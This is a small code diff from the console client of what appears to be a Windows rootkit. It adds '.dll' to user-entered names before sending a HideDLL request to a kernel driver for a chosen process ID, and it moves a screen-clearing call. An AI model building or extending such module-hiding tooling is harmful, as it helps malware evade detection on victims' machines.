@@ -236,6 +236,10 @@ int main() {
             std::cin >> pidDLLHide;
             std::wcout << L"\nEnter the DLL name you wish to hide (e.g., example.dll): ";
             std::wcin >> tempDLLName;
+            // Check and append .dll if missing
+            if (tempDLLName.length() < 4 || tempDLLName.substr(tempDLLName.length() - 4) != L".dll") {
+                tempDLLName += L".dll";
+            }
             wcsncpy_s(DLLName, tempDLLName.c_str(), _TRUNCATE);
             std::wcout << L"[!] Sending Message to Driver.\n";
             Rootkit::HideDLL(driver_handle, pidDLLHide, DLLName);
@@ -252,8 +256,8 @@ int main() {
             system("cls");
             break;
         }
+               Sleep(2000);
+               system("cls");
         }
-        Sleep(2000);
-        system("cls");
     }
 }
